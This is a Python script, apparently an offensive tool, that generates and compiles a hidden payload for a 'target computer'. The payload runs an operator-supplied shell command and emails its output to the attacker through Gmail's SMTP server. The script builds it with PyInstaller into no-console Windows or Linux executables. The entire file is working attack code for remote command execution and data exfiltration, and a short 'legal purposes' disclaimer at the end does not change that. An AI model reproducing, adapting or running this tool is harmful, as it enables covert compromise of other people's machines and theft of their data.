import requests, subprocess, re, os, tempfile, sys, optparse, argparse
owd = os.getcwd()
WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/Python27/Scripts/pyinstaller.exe")
def get_arguments():
		parser = argparse.ArgumentParser(description='Download and Execute Payload Options')
		parser.add_argument("-u", "--username", dest="username",help="Email Address Username", required=True)
		parser.add_argument("-p", "--password", dest="password",help="Email Address Password", required=True)
		parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
		parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
		parser.add_argument("-c", "--command", dest="command", help="Command to be executed in target computer", required=True)
		return parser.parse_args()
file_name = "payload.py"
def compile_for_windows(file_name):
    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])

def compile_for_linux(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

arguments = get_arguments()


def create_payload(file_name, username, password, command):
	os.chdir(owd)
	with open(file_name, "w+") as file:
		file.write('from subprocess import check_output\n')
		file.write ('import smtplib\n')
		file.write ('command =' '"' + command + '"'+  '\n')
		file.write ('email =' '"' + username + '"'+ '\n')
		file.write ('password =' + '"' + password + '"'+  '\n')
		file.write('output = check_output(command, shell=True)\n')
		file.write('server = smtplib.SMTP("smtp.gmail.com", 587)\n')
		file.write('server.starttls()\n')
		file.write('server.login(' + '"' + username + '"' +  ','  + '"' + password  + '"' +')\n')
		file.write('message = " ** Command Reporter ** \\n"\n')
		file.write('message = ' + 'message' + "+" + '" Result of "' + '+' + 'command' +  "+" + ' " \\n"' + '\n')
		file.write('server.sendmail(' + '"' + username + '"' +',' + '"' +  username	 + '"' +',' + 'message' + '+' + 'output' + ')' +  '\n' )
		file.write('server.quit()')




create_payload(file_name, arguments.username, arguments.password, arguments.command)

if arguments.windows:
	compile_for_windows(file_name)

if arguments.linux:
	compile_for_linux(file_name)

print("\n\n[***] Please use this tool for Legal and Valid Purposes\n")
print("Thanks for using this tool :)")
